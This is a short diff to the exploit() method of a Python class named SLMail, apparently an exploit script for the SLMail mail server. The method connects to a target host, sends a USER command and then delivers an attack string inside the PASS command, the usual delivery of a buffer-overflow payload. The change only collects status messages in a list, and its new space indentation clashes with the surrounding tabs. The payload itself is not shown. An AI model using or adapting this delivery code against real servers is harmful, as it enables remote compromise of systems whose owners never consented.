@@ -43,21 +43,27 @@ class SLMail():
 		
 
 	def exploit(self):
-		try:
-			print('[*] Creating Connection')
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-			s.connect((ip,port))
-			s.recv(1024)
+            results = []
+            
+            try:
+                results.append('[*] Creating Connection')
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-			print('[*] Sending user name')
-			s.send('USER doink\r\n')
-			s.recv(1024)
+                s.connect((ip,port))
+                s.recv(1024)
 
-			print('[*] Sending payload')
-			s.send('PASS ' + self.attack_string + '\r\n')
+                results.append('[*] Sending user name')
+                s.send('USER doink\r\n')
+                s.recv(1024)
 
-			s.close()
+                results.append('[*] Sending payload')
+                s.send('PASS ' + self.attack_string + '\r\n')
 
-		except:
-			print('[-] There was an unexpected error')
+                s.close()
+
+            except:
+                results.append('[-] There was an unexpected error')
+
+            finally:
+                return results
